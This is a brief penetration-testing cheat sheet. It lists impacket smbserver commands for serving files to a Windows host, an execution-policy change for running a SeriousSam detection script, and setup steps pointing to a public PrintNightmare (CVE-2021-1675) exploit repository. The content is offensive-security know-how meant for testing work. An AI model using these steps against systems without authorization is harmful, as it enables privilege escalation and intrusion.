# Pentest Guides 

## Feching files to Windows host

Linux | Windows
-------|--------
`sudo smbserver.py -smb2support -user complexia -password complexia share $(pwd)` | `\\192.168.1.1\share\$(filename)`
`sudo smbserver.py share $(pwd) -smb2support` | `\\192.168.1.1\share\$(filename)`



## Vulnerabilities - Windows

### -> SeriousSam

***Setup Command***

*Running a script on a low privilege user will cause an error, run the command below*

`Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser`


**Discovery methods**

Method | Command
-------|--------
PowerShell | `.\SeriousSam.ps1`

Link to [Github Repository](https://github.com/romarroca/SeriousSam/blob/main/serioussam.ps1)

### -> PrintNightmare

***Setup Command***

*Download virtualenv* --> `sudo apt install virtualenv`

*Create virtual enviroment by sudo privileges with the command -->* `virtualenv --python=python3 impacket`

*Git clone * [Repository](https://github.com/cube0x0/CVE-2021-1675)


